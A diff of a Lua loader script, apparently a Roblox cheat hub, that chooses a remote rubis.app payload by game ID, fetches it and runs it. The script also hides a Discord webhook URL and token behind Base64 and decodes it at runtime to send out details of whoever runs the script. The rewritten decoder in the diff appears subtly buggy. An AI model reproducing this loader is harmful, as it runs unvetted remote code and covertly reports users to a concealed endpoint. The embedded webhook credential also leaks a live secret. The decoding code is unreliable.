@@ -1,5 +1,5 @@
 -----------------------------------------------------
--- CONFIG Kkt
+-- CONFIG
 -----------------------------------------------------
 local BROOKHAVEN_PLACEID    = 4924922222
 local TRAINING_PLACEID      = 16572004551
@@ -10,46 +10,57 @@ local cardealerUrl  = "https://api.rubis.app/v2/scrap/KCHqlYKLFkFO0a4W/raw"
 local brookhavenUrl = "https://api.rubis.app/v2/scrap/vk01i5gl1i7wg1tZ/raw"
 local universalUrl  = "https://api.rubis.app/v2/scrap/xQcqCfCZHddaQr2R/raw"
 
--- Webhook em Base64
+-- Webhook em Base64 (GERADA CORRETAMENTE)
 local encryptedWebhook = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ4NTAxNzU5NzM3MTA4ODkzNi9TcEFTbERlVnNzcHplNG44OF93ZG1oN3FiTjVJY0RJYmh1cjI4THlydFVqMVhNLUlzbEJHWkdmdUNreHp1RU11UFoxeQ=="
 
 -----------------------------------------------------
--- Decodificador Base64
+-- DECODIFICADOR BASE64 SIMPLES
 -----------------------------------------------------
 
 local function base64Decode(data)
-    local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
-    data = data:gsub('=', '')
+    local b64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
+    data = string.gsub(data, "[^"..b64.."=]", "")
     
-    local result = {}
+    local result = ""
     for i = 1, #data, 4 do
         local chunk = data:sub(i, i+3)
         local n = 0
-        for j = 1, #chunk do
-            local char = chunk:sub(j, j)
-            local index = b64chars:find(char) - 1
-            if not index then break end
-            n = n * 0x40 + index
-        end
-        
-        local bytes = {}
-        for j = 1, 3 do
-            local byte = math.floor(n / (0x100 ^ (3 - j))) % 0x100
-            if byte > 0 then
-                bytes[j] = string.char(byte)
+        for j = 1, 4 do
+            local c = chunk:sub(j, j)
+            if c == "=" then 
+                n = n * 64
+            else
+                local pos = string.find(b64, c) - 1
+                if pos then
+                    n = n * 64 + pos
+                end
             end
         end
-        result[#result + 1] = table.concat(bytes)
+        
+        local bytes = string.char(
+            math.floor(n / 0x10000) % 0x100,
+            math.floor(n / 0x100) % 0x100,
+            n % 0x100
+        )
+        
+        -- Remove bytes extras se tiver padding
+        local pad = string.match(data, "=+$")
+        if pad then
+            local pcount = #pad
+            bytes = bytes:sub(1, 4 - pcount)
+        end
+        
+        result = result .. bytes
     end
     
-    return table.concat(result)
+    return result
 end
 
 -- Decodifica a webhook
 local webhookUrl = base64Decode(encryptedWebhook)
 
 -----------------------------------------------------
--- Webhook
+-- WEBHOOK
 -----------------------------------------------------
 
 local function getAvatarUrl(userId)
@@ -131,7 +142,7 @@ local function sendWebhook()
 end
 
 -----------------------------------------------------
--- Fast Load
+-- FAST LOAD
 -----------------------------------------------------
 local function fastLoad(url)
     local successHttp, source = pcall(function()
@@ -153,7 +164,7 @@ local function fastLoad(url)
 end
 
 -----------------------------------------------------
--- Detecção do Jogo e Execução
+-- DETECÇÃO DO JOGO
 -----------------------------------------------------
 local id = game.PlaceId
 
